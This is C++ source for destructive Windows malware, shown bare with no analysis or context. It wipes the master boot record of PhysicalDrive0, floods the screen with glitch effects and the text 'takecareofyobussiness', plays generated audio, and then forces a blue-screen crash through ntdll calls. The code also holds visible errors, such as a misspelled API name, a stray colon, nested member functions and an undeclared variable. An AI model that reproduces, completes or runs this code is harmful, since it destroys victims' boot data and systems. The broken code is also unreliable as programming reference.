#include <Windows.h>
#include <mmsystem.h>
#include <tchar.h>
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Kernel32.lib")

EXTERN_C NTSTATUS NTAPI P(NTSTATUS, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI B(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG):

VOID WINAPI Overwrite(){
    DWORD main;
    char d[512];
    ZeroMemory(&d, sizeof(main));
    HANDLE mbr = CreateFile(_T("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    WriteFile(mbr, d, 512, &main, NULL);
    CloseHandle(mbr);
}

VOID WINAPI BSOD(){
    BOOLEAN p;
    unsigned long b;
    P(19, true, false, &p);
    B(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &main);
}

class PayLoads{
    public:
        DWORD WINAPI PL(LPVOID har){
            HDC desk = GetDC(0);
            HBITMAP h = CreateCompatibleBItmap(desk, rand() % 155, rand() % 255);
            int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
            while(1){
                desk = GetDC(0);
                BitBlt(desk, rand() % 155, rand() % 255, m, p, desk, rand() % 255, rand() % 155, SRCINVERT);
                PatBlt(desk, rand() % 255, rand() % 155, m, p, PATINVERT);
            }
            DWORD WINAPI PL2(LPVOID har){
                HDC desk = GetDC(0);
                HBITMAP h = CreateCompatibleBitmap(desk, rand() % 255, rand() % 155);
                HDC d = CreateCompatibleDC(desk);
                int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
                while(1){
                    desk = GetDC(0);
                    HBRUSH b = SelectObject(desk, CreateSolidBrush(RGB(rand() % 155, rand() % 255, rand() % 355)));
                    BitBlt(desk, rand() % 2, rand() % 2, m, p, d, rand() % 2, rand() % 2, SRCCOPY);
                    PatBlt(desk, rand() % 155, rand() % 255, m, p, PATINVERT);
                }
            }
            DWORD WINAPI PL3(LPVOID har){
                HDC desk = GetDC(0);
                int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
                while(1){
                    desk = GetDC(0);
                    StretchBlt(desk, rand() % 155, rand() % 255, m - 1. p -1, desk, rand() % 255, rand() % 155, m, p, SRCCOPY);
                    PatBlt(desk, rand() % 255, rand() % 155, m, p, PATINVERT);
                }
            }
            DWORD WINAPI PL4(LPVOID har){
                HDC desk = GetDC(0);
                int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
                while(1){
                    desk = GetDC(0);
                    HBRUSH h = SelectObject(desk, CreateSolidBrush(RGB(rand() % 355, rand() % 455, rand() % 555)));
                    PatBlt(desk, rand() % 155, rand() % 255, m, p, PATINVERT);
                    BitBlt(desk, rand() % 255, rand() % 155, m, p, desk, rand() % 255, rand() % 155, SRCAND);
                }
            }
            DWORD WINAPI PL5(LPVOID har){
                    HDC desk = GetDC(0);
                    HBITMAP h = CreateCompatibleBitmap(desk, rand() % 155, rand() % 255);
                    int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
                    LPCWSTR text = L"takecareofyobussiness";
                    while(1){
                        desk = GetDC(0);
                        HBRUSH b = SelectObject(desk, CreateSolidBrush(RGB(rand() % 155, rand() % 255, rand() % 355)));
                        SetTextColor(desk, RGB(rand() % 155, rand() % 255, rand() % 355));
                        SetBkColor(desk, RGB(0, 0, 0));
                        TextOutW(desk, rand() % m, rand() % p, text, wcslen(text));
                        PatBlt(desk, rand() % 255, rand() % 155, m, p, PATINVERT);
                    }
            }
};

VOID WINAPI Sound(){
    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    
    char buffer[8000 * 20];
    
    for(DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>(t*(2 >> (1&t>>11))*(5+(3&t>>14))>>(3&t>>8)|t>>2);
        
    WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

VOID WINAPI Sound2(){
    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    
    char buffer[8000 * 20];
    
    for(DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>(t*(t&16384?6:5)*(1+(1&t>>12))>>(3&t>>8)|t>>3);
        
    WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

VOID WINAPI Sound3(){
    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    
    char buffer[8000 * 20];
    
    for(DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>(t*((t >> 20 | t >> 10 & 3)&32 >> 10 | t >> 7 * 2));
        
    WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

VOID WINAPI Sound4(){
    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    
    char buffer[8000 * 20];
    
    for(DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>(t*(t&16384?6:5)*(3+(1&t>>8))>>(3&t>>8)|t>>4);
        
    WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

VOID WINAPI Sound5(){
    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    
    char buffer[8000 * 20];
    
    for(DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>(t*(t&16384?6:5)*(4 >> (1&t>>8))>>(3&t>>9)|(t|t*3)>>5);
        
    WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR real, int yes){
    Overwrite();
    PayLoads pll;
    HANDLE thread = CreateThread(0, 0, pll.PL, 0, 0, 0);
    Sound();
    Sleep(20000);
    TerminateThread(thread, 0);
    InvalidateRect(0, 0, 0);
    Sleep(1000);
    HANDLE thread2 = CreateThread(0, 0, pll.PL2, 0, 0, 0);
    Sound2();
    Sleep(20000);
    TerminateThread(thread2, 0);
    InvalidateRect(0, 0, 0);
    Sleep(1000);
    HANDLE thread3 = CreateThread(0, 0, pll.PL3, 0, 0, 0);
    Sound3();
    Sleep(20000);
    TerminateThread(thread3, 0);
    InvalidateRect(0, 0, 0);
    Sleep(1000);
    HANDLE thread4 = CreateThread(0, 0, pll.PL4, 0, 0, 0);
    Sound4();
    Sleep(20000);
    TerminateThread(thread4, 0);
    InvalidateRect(0, 0, 0);
    Sleep(1000);
    HANDLE thread5 = CreateThread(0, 0, pll.PL5, 0, 0, 0);
    Sound5();
    Sleep(20000);
    TerminateThread(thread5, 0);
    InvalidateRect(0, 0, 0);
    Sleep(1000);
    BSOD();
}
